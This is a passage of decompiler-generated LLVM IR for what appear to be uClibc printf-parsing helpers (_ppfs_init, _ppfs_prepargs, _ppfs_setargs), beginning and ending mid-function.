dec_label_pc_ba48:                                ; preds = %dec_label_pc_ba30, %dec_label_pc_b7b8, %dec_label_pc_b5dc
  %stack_var_-316.3 = phi i32 [ %v0_b630, %dec_label_pc_b5dc ], [ %v0_b954, %dec_label_pc_ba30 ], [ %v0_b630, %dec_label_pc_b7b8 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_b5dc ], [ %v2_b940, %dec_label_pc_ba30 ], [ %v2_b7bc, %dec_label_pc_b7b8 ]
  %v3_ba48 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_ba48, i32* @r4, align 4
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_ba48
  %v0_ba4c = phi i32 [ %v0_ba4c.pre, %dec_label_pc_b4ec ], [ %v3_ba48, %dec_label_pc_ba48 ]
  %v0_b630 = phi i32 [ %tmp100, %dec_label_pc_b4ec ], [ %stack_var_-316.3, %dec_label_pc_ba48 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_b4ec ], [ %stack_var_-336.3, %dec_label_pc_ba48 ]
  store i32 %v0_ba4c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b504.outer

dec_label_pc_b504.outer:                          ; preds = %dec_label_pc_ba54, %dec_label_pc_ba4c
  %v5_b530 = phi i32 [ %v1_b560, %dec_label_pc_ba54 ], [ %v0_ba4c, %dec_label_pc_ba4c ]
  %v0_b50449 = phi i32 [ %v1_ba54, %dec_label_pc_ba54 ], [ %v0_ba4c, %dec_label_pc_ba4c ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_ba54 ], [ %stack_var_-336.4, %dec_label_pc_ba4c ]
  %v1_b504180 = inttoptr i32 %v0_b50449 to i8*
  %v2_b504181 = load i8, i8* %v1_b504180, align 1
  %v3_b504182 = zext i8 %v2_b504181 to i32
  store i32 %v3_b504182, i32* %r3.global-to-local, align 4
  %v2_b508183 = icmp eq i8 %v2_b504181, 0
  br i1 %v2_b508183, label %dec_label_pc_b520, label %bb126

dec_label_pc_ba54:                                ; preds = %dec_label_pc_b560
  %v1_ba54 = add i32 %v0_b568, 2
  store i32 %v1_ba54, i32* @r4, align 4
  br label %dec_label_pc_b504.outer

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_b8cc, %dec_label_pc_ba30, %.thread36, %dec_label_pc_b97c, %dec_label_pc_b960, %dec_label_pc_b830, %bb162, %dec_label_pc_b794, %bb130, %dec_label_pc_ba0c
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_b554, %bb, %dec_label_pc_b4d4, %dec_label_pc_ba5c
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_b4d4 ], [ -1, %dec_label_pc_ba5c ], [ %stack_var_-336.2, %dec_label_pc_b554 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* @r5, align 4
  store i32 %v15_b490, i32* %r8.global-to-local, align 4
  store i32 %v18_b490, i32* @sb, align 4
  store i32 %v21_b490, i32* @sl, align 4
  store i32 %v24_b490, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_ba54, { 1, 0 }
  uselistorder i8 %v2_b504181, { 1, 2, 0 }
  uselistorder i32 %v0_b50449, { 2, 0, 1 }
  uselistorder i32 %v5_b530, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b630, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_ba4c, { 1, 0, 2 }
  uselistorder i32 %v1_b9e0, { 2, 1, 0 }
  uselistorder i32 %v0_b9e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b968, { 1, 0 }
  uselistorder i32 %v2_b94c, { 2, 0, 1 }
  uselistorder i1 %v3_b92c, { 1, 0 }
  uselistorder i32 %v0_b93c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_b910, { 1, 0 }
  uselistorder i32 %v0_b954, { 1, 0, 2 }
  uselistorder i32 %v3_b8e4, { 1, 2, 0 }
  uselistorder i32 %v0_b894, { 1, 0 }
  uselistorder i32 %v2_b878, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_b840, { 1, 2, 0, 3 }
  uselistorder i32 %v0_b80c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b710, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_b72c, { 1, 2, 3, 0 }
  uselistorder i32 %v6_b6ac, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_b610, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_b5c0.pre, { 2, 1, 0 }
  uselistorder i32 %v1_b5b8, { 1, 0 }
  uselistorder i32 %v1_b560, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_b520, { 1, 0 }
  uselistorder i32 %v1_b518.lcssa, { 1, 0 }
  uselistorder i8 %v2_b504, { 1, 2, 0 }
  uselistorder i32 %v2_b518, { 1, 2, 3, 0 }
  uselistorder i1 %v7_b724, { 1, 0 }
  uselistorder i1 %v7_b670, { 1, 2, 0 }
  uselistorder i1 %v7_b868, { 1, 0 }
  uselistorder i1 %v7_b7c8, { 1, 0 }
  uselistorder i1 %v7_b6b4, { 1, 0 }
  uselistorder i32 %v2_b808, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b8d8, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_b5e8, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_b5bc, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_b59c, { 1, 2, 0 }
  uselistorder i32 %v4_b594, { 1, 0 }
  uselistorder i32 %v2_b498, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 5, 6, 3, 4, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 1, 34, 35, 36, 37, 3, 2, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ba5c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba0c, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_b928, { 1, 0 }
  uselistorder label %dec_label_pc_b90c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b90cthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b900, { 1, 0 }
  uselistorder label %dec_label_pc_b8f0, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_b884, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_b660, { 1, 0 }
  uselistorder label %dec_label_pc_b65c, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b5b4, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_ba84 = load i32, i32* @r4, align 4
  store i32 %v3_ba84, i32* %stack_var_-12, align 4
  %v6_ba84 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_ba90 = load i32, i32* @r1, align 4
  store i32 %v0_ba90, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ba98 = bitcast i32* %arg1 to i8*
  %v3_ba98 = call i32 @__GI_memset(i8* %v2_ba98, i32 0)
  %v0_ba9c = load i32, i32* @r4, align 4
  %v1_ba9c = add i32 %v0_ba9c, 24
  %v2_ba9c = inttoptr i32 %v1_ba9c to i32*
  %v3_ba9c = load i32, i32* %v2_ba9c, align 4
  %v1_baa0 = add i32 %v3_ba9c, -1
  store i32 %v1_baa0, i32* %v2_ba9c, align 4
  %v0_baa8 = load i32, i32* @r5, align 4
  %v1_baa8 = load i32, i32* @r4, align 4
  %v2_baa8 = inttoptr i32 %v1_baa8 to i32*
  store i32 %v0_baa8, i32* %v2_baa8, align 4
  %v0_baac = load i32, i32* @r4, align 4
  %v1_baac = add i32 %v0_baac, 40
  store i32 %v1_baac, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_babc19 = inttoptr i32 %v1_baac to i32*
  store i32 8, i32* %v2_babc19, align 4
  %v3_babc20 = load i32, i32* %r1.global-to-local, align 4
  %v4_babc21 = add i32 %v3_babc20, 4
  store i32 %v4_babc21, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge

dec_label_pc_bab4.dec_label_pc_bab4_crit_edge:    ; preds = %entry, %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge
  %v4_babc22 = phi i32 [ %v4_babc21, %entry ], [ %v4_babc, %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge ]
  %v0_bab8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_bab8 = add i32 %v0_bab8.pre, -1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v7_bab8 = icmp eq i32 %v0_bab8.pre, 1
  %v2_babc = inttoptr i32 %v4_babc22 to i32*
  store i32 8, i32* %v2_babc, align 4
  %v3_babc = load i32, i32* %r1.global-to-local, align 4
  %v4_babc = add i32 %v3_babc, 4
  store i32 %v4_babc, i32* %r1.global-to-local, align 4
  br i1 %v7_bab8, label %dec_label_pc_bac4, label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge

dec_label_pc_bac4:                                ; preds = %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r2.global-to-local, align 4
  %v1_bb083 = inttoptr i32 %v0_bac4 to i8*
  %v2_bb084 = load i8, i8* %v1_bb083, align 1
  %v2_bb0c6 = icmp eq i8 %v2_bb084, 0
  br i1 %v2_bb0c6, label %dec_label_pc_bb14, label %dec_label_pc_bad4

dec_label_pc_bacc:                                ; preds = %dec_label_pc_baec
  %v2_bad0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bad0, i32* @r4, align 4
  store i32 %v6_ba84, i32* @r5, align 4
  ret i32 -1

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bac4, %dec_label_pc_bb08.backedge
  %v0_badc = phi i32 [ %storemerge, %dec_label_pc_bb08.backedge ], [ %v0_bac4, %dec_label_pc_bac4 ]
  %v2_bb087 = phi i8 [ %v2_bb08, %dec_label_pc_bb08.backedge ], [ %v2_bb084, %dec_label_pc_bac4 ]
  %v7_bad4 = icmp eq i8 %v2_bb087, 37
  br i1 %v7_bad4, label %dec_label_pc_badc, label %dec_label_pc_bb04

dec_label_pc_badc:                                ; preds = %dec_label_pc_bad4
  %v1_badc = add i32 %v0_badc, 1
  %v2_badc = inttoptr i32 %v1_badc to i8*
  %v3_badc = load i8, i8* %v2_badc, align 1
  store i32 %v1_badc, i32* %r2.global-to-local, align 4
  %v7_bae0 = icmp eq i8 %v3_badc, 37
  br i1 %v7_bae0, label %dec_label_pc_bb04, label %dec_label_pc_baec

dec_label_pc_baec:                                ; preds = %dec_label_pc_badc
  %v0_bae4 = load i32, i32* @r4, align 4
  %v2_baec = inttoptr i32 %v0_bae4 to i32*
  store i32 %v1_badc, i32* %v2_baec, align 4
  %v2_baf0 = call i32 @_ppfs_parsespec(i32* %v2_baec)
  %v1_baf4 = icmp slt i32 %v2_baf0, 0
  br i1 %v1_baf4, label %dec_label_pc_bacc, label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_baec
  %v0_bafc = load i32, i32* @r4, align 4
  %v1_bafc = inttoptr i32 %v0_bafc to i32*
  %v2_bafc = load i32, i32* %v1_bafc, align 4
  br label %dec_label_pc_bb08.backedge

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_badc
  %v0_bb04 = phi i32 [ %v0_badc, %dec_label_pc_bad4 ], [ %v1_badc, %dec_label_pc_badc ]
  %v1_bb04 = add i32 %v0_bb04, 1
  br label %dec_label_pc_bb08.backedge

dec_label_pc_bb08.backedge:                       ; preds = %dec_label_pc_bb04, %dec_label_pc_bafc
  %storemerge = phi i32 [ %v1_bb04, %dec_label_pc_bb04 ], [ %v2_bafc, %dec_label_pc_bafc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %storemerge to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %v2_bb0c = icmp eq i8 %v2_bb08, 0
  br i1 %v2_bb0c, label %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge, label %dec_label_pc_bad4

dec_label_pc_bb08.dec_label_pc_bb14_crit_edge:    ; preds = %dec_label_pc_bb08.backedge
  %v0_bb14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bb14

dec_label_pc_bb14:                                ; preds = %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge, %dec_label_pc_bac4
  %v0_bb14 = phi i32 [ %v0_bb14.pre, %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge ], [ %v0_bac4, %dec_label_pc_bac4 ]
  %v3_bb08.lcssa.in = phi i8 [ %v2_bb08, %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge ], [ %v2_bb084, %dec_label_pc_bac4 ]
  %v3_bb08.lcssa = zext i8 %v3_bb08.lcssa.in to i32
  %v1_bb14 = load i32, i32* @r4, align 4
  %v2_bb14 = inttoptr i32 %v1_bb14 to i32*
  store i32 %v0_bb14, i32* %v2_bb14, align 4
  %v2_bb18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bb18, i32* @r4, align 4
  store i32 %v6_ba84, i32* @r5, align 4
  ret i32 %v3_bb08.lcssa

; uselistorder directives
  uselistorder i8 %v2_bb08, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_bac4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_babc, { 1, 0 }
  uselistorder i32 %v0_bab8.pre, { 1, 0 }
  uselistorder i32 %v6_ba84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_bad4, { 1, 0 }
  uselistorder label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bb1c = load i32, i32* @r4, align 4
  store i32 %v3_bb1c, i32* %stack_var_-12, align 4
  %v1_bb20 = add i32 %arg1, 24
  %v2_bb20 = inttoptr i32 %v1_bb20 to i32*
  %v3_bb20 = load i32, i32* %v2_bb20, align 4
  store i32 %v3_bb20, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_bb30 = add i32 %arg1, 76
  %v3_bb30 = inttoptr i32 %v2_bb30 to i32*
  store i32 %arg2, i32* %v3_bb30, align 4
  %v7_bb34 = icmp sgt i32 %v3_bb20, 0
  br i1 %v7_bb34, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_bb34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_bb34, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_bb38 = load i32, i32* %r3.global-to-local, align 4
  %v2_bb38 = add i32 %arg1, 8
  %v3_bb38 = inttoptr i32 %v2_bb38 to i32*
  store i32 %v0_bb38, i32* %v3_bb38, align 4
  %v0_bb3c = load i32, i32* %r5.global-to-local, align 4
  %v2_bb3c = add i32 %arg1, 28
  %v3_bb3c = inttoptr i32 %v2_bb3c to i32*
  store i32 %v0_bb3c, i32* %v3_bb3c, align 4
  %v0_bb40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_bb40, i32* %v2_bb20, align 4
  %v0_bb44 = load i32, i32* %r3.global-to-local, align 4
  %v2_bb44 = add i32 %arg1, 4
  %v3_bb44 = inttoptr i32 %v2_bb44 to i32*
  store i32 %v0_bb44, i32* %v3_bb44, align 4
  %v0_bb48 = call i32 @_ppfs_setargs()
  %v0_bb4c = load i32, i32* %r5.global-to-local, align 4
  %v1_bb4c = load i32, i32* @r4, align 4
  %v2_bb4c = add i32 %v1_bb4c, 24
  %v3_bb4c = inttoptr i32 %v2_bb4c to i32*
  store i32 %v0_bb4c, i32* %v3_bb4c, align 4
  %v2_bb50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bb50, i32* @r4, align 4
  ret i32 %v0_bb48

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 5, 3, 6, 2, 1, 4, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_bb54 = load i32, i32* @r0, align 4
  %v1_bb54 = add i32 %v0_bb54, 24
  %v2_bb54 = inttoptr i32 %v1_bb54 to i32*
  %v3_bb54 = load i32, i32* %v2_bb54, align 4
  store i32 %v3_bb54, i32* %r1.global-to-local, align 4
  %v2_bb58 = icmp eq i32 %v3_bb54, 0
  %v3_bb5c = load i32, i32* @r4, align 4
  store i32 %v3_bb5c, i32* %stack_var_-8, align 4
  %v1_bb60 = add i32 %v0_bb54, 80
  store i32 %v1_bb60, i32* %ip.global-to-local, align 4
  %v1_bb64 = add i32 %v0_bb54, 8
  %v2_bb64 = inttoptr i32 %v1_bb64 to i32*
  %v3_bb64 = load i32, i32* %v2_bb64, align 4
  store i32 %v3_bb64, i32* %r3.global-to-local, align 4
  %v6_bb6c = icmp eq i32 %v3_bb64, -2147483648
  br i1 %v2_bb58, label %dec_label_pc_bb6c, label %dec_label_pc_bc90

dec_label_pc_bb6c:                                ; preds = %entry
  br i1 %v6_bb6c, label %dec_label_pc_bb74, label %dec_label_pc_bb8c

dec_label_pc_bb74:                                ; preds = %dec_label_pc_bb6c
  %v1_bb74 = add i32 %v0_bb54, 76
  %v2_bb74 = inttoptr i32 %v1_bb74 to i32*
  %v3_bb74 = load i32, i32* %v2_bb74, align 4
  store i32 %v3_bb74, i32* %r3.global-to-local, align 4
  %v1_bb78 = inttoptr i32 %v3_bb74 to i32*
  %v2_bb78 = load i32, i32* %v1_bb78, align 4
  store i32 %v2_bb78, i32* %r2.global-to-local, align 4
  %v1_bb7c = add i32 %v3_bb74, 4
  store i32 %v1_bb7c, i32* %r3.global-to-local, align 4
  store i32 %v1_bb7c, i32* %v2_bb74, align 4
  %v0_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb84 = load i32, i32* @r0, align 4
  %v2_bb84 = add i32 %v1_bb84, 8
  %v3_bb84 = inttoptr i32 %v2_bb84 to i32*
  store i32 %v0_bb84, i32* %v3_bb84, align 4
  %v0_bb88 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb88 = load i32, i32* @r0, align 4
  %v2_bb88 = add i32 %v1_bb88, 80
  %v3_bb88 = inttoptr i32 %v2_bb88 to i32*
  store i32 %v0_bb88, i32* %v3_bb88, align 4
  %v0_bb8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %dec_label_pc_bb6c, %dec_label_pc_bb74
  %v1_bba4 = phi i32 [ %v0_bb54, %dec_label_pc_bb6c ], [ %v0_bb8c.pre, %dec_label_pc_bb74 ]
  %v1_bb8c = add i32 %v1_bba4, 4
  %v2_bb8c = inttoptr i32 %v1_bb8c to i32*
  %v3_bb8c = load i32, i32* %v2_bb8c, align 4
  store i32 %v3_bb8c, i32* %r3.global-to-local, align 4
  %v6_bb90 = icmp eq i32 %v3_bb8c, -2147483648
  br i1 %v6_bb90, label %dec_label_pc_bb98, label %dec_label_pc_bbb0

dec_label_pc_bb98:                                ; preds = %dec_label_pc_bb8c
  %v1_bb98 = add i32 %v1_bba4, 76
  %v2_bb98 = inttoptr i32 %v1_bb98 to i32*
  %v3_bb98 = load i32, i32* %v2_bb98, align 4
  store i32 %v3_bb98, i32* %r3.global-to-local, align 4
  %v1_bb9c = inttoptr i32 %v3_bb98 to i32*
  %v2_bb9c = load i32, i32* %v1_bb9c, align 4
  store i32 %v2_bb9c, i32* %r2.global-to-local, align 4
  %v1_bba0 = add i32 %v3_bb98, 4
  store i32 %v1_bba0, i32* %r3.global-to-local, align 4
  store i32 %v1_bba0, i32* %v2_bb98, align 4
  %v0_bba8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bba8 = load i32, i32* @r0, align 4
  %v2_bba8 = add i32 %v1_bba8, 4
  %v3_bba8 = inttoptr i32 %v2_bba8 to i32*
  store i32 %v0_bba8, i32* %v3_bba8, align 4
  %v0_bbac = load i32, i32* %r2.global-to-local, align 4
  %v1_bbac = load i32, i32* @r0, align 4
  %v2_bbac = add i32 %v1_bbac, 80
  %v3_bbac = inttoptr i32 %v2_bbac to i32*
  store i32 %v0_bbac, i32* %v3_bbac, align 4
  %v0_bc8018.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bb8c, %dec_label_pc_bb98
  %v0_bc8018 = phi i32 [ %v1_bba4, %dec_label_pc_bb8c ], [ %v0_bc8018.pre, %dec_label_pc_bb98 ]
  %v0_bbb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_bbb0, i32* @lr, align 4
  %v1_bc8019 = add i32 %v0_bc8018, 28
  %v2_bc8020 = inttoptr i32 %v1_bc8019 to i32*
  %v3_bc8021 = load i32, i32* %v2_bc8020, align 4
  store i32 %v3_bc8021, i32* %r3.global-to-local, align 4
  %v5_bc8823 = icmp slt i32 %v0_bbb0, %v3_bc8021
  br i1 %v5_bc8823, label %dec_label_pc_bbb8, label %dec_label_pc_bc8c.loopexit

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bbb0, %dec_label_pc_bc7c
  %v0_bc8025 = phi i32 [ %v0_bc80, %dec_label_pc_bc7c ], [ %v0_bc8018, %dec_label_pc_bbb0 ]
  %v1_bbb824 = phi i32 [ %v1_bc7c, %dec_label_pc_bc7c ], [ %v0_bbb0, %dec_label_pc_bbb0 ]
  %v4_bbb8 = mul i32 %v1_bbb824, 4
  %v5_bbb8 = add i32 %v0_bc8025, %v4_bbb8
  store i32 %v5_bbb8, i32* %r3.global-to-local, align 4
  %v1_bbbc = add i32 %v5_bbb8, 40
  %v2_bbbc = inttoptr i32 %v1_bbbc to i32*
  %v3_bbbc = load i32, i32* %v2_bbbc, align 4
  store i32 %v3_bbbc, i32* %r2.global-to-local, align 4
  %v7_bbc0 = icmp eq i32 %v3_bbbc, 8
  br i1 %v7_bbc0, label %dec_label_pc_bc7c, label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bbb8
  %v1_bbc8 = add i32 %v0_bc8025, 76
  %v2_bbc8 = inttoptr i32 %v1_bbc8 to i32*
  %v3_bbc8 = load i32, i32* %v2_bbc8, align 4
  store i32 %v3_bbc8, i32* %r1.global-to-local, align 4
  %v8_bbcc = icmp sgt i32 %v3_bbbc, 8
  br i1 %v8_bbcc, label %dec_label_pc_bbf0, label %dec_label_pc_bbd0

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bbc8
  %v7_bbd0 = icmp eq i32 %v3_bbbc, 2
  br i1 %v7_bbd0, label %dec_label_pc_bc3c, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbd0
  %v8_bbd8 = icmp sgt i32 %v3_bbbc, 2
  br i1 %v8_bbd8, label %dec_label_pc_bbe8, label %dec_label_pc_bbdc

dec_label_pc_bbdc:                                ; preds = %dec_label_pc_bbd8
  %v1_bbdc = icmp slt i32 %v3_bbbc, 0
  br i1 %v1_bbdc, label %dec_label_pc_bc68, label %dec_label_pc_bc3c

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bbd8
  %v7_bbe8 = icmp eq i32 %v3_bbbc, 7
  br i1 %v7_bbe8, label %dec_label_pc_bc50, label %dec_label_pc_bc68

dec_label_pc_bbf0:                                ; preds = %dec_label_pc_bbc8
  %v7_bbf0 = icmp eq i32 %v3_bbbc, 1024
  br i1 %v7_bbf0, label %dec_label_pc_bc3c, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbf0
  %v8_bbf8 = icmp sgt i32 %v3_bbbc, 1024
  br i1 %v8_bbf8, label %dec_label_pc_bc10, label %dec_label_pc_bbfc

dec_label_pc_bbfc:                                ; preds = %dec_label_pc_bbf8
  switch i32 %v3_bbbc, label %dec_label_pc_bc68 [
    i32 256, label %dec_label_pc_bc3c
    i32 512, label %dec_label_pc_bc3c
  ]

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bbf8
  %v7_bc10 = icmp eq i32 %v3_bbbc, 2048
  br i1 %v7_bc10, label %dec_label_pc_bc28, label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bc10
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_bc1c = icmp eq i32 %v3_bbbc, 2055
  br i1 %v9_bc1c, label %dec_label_pc_bc50, label %dec_label_pc_bc68

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc10
  %v1_bc28 = add i32 %v3_bbc8, 8
  store i32 %v1_bc28, i32* %r3.global-to-local, align 4
  store i32 %v1_bc28, i32* %v2_bbc8, align 4
  %v0_bc30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc30 = inttoptr i32 %v0_bc30 to i32*
  %v2_bc30 = load i32, i32* %v1_bc30, align 4
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v3_bc30 = add i32 %v0_bc30, 4
  %v4_bc30 = inttoptr i32 %v3_bc30 to i32*
  %v5_bc30 = load i32, i32* %v4_bc30, align 4
  store i32 %v5_bc30, i32* %r4.global-to-local, align 4
  %v0_bc34 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc34 = inttoptr i32 %v0_bc34 to i32*
  store i32 %v2_bc30, i32* %v1_bc34, align 4
  %v3_bc34 = add i32 %v0_bc34, 4
  %v4_bc34 = inttoptr i32 %v3_bc34 to i32*
  %v5_bc34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_bc34, i32* %v4_bc34, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc3c:                                ; preds = %dec_label_pc_bbfc, %dec_label_pc_bbfc, %dec_label_pc_bbdc, %dec_label_pc_bbf0, %dec_label_pc_bbd0
  %v1_bc3c = inttoptr i32 %v3_bbc8 to i32*
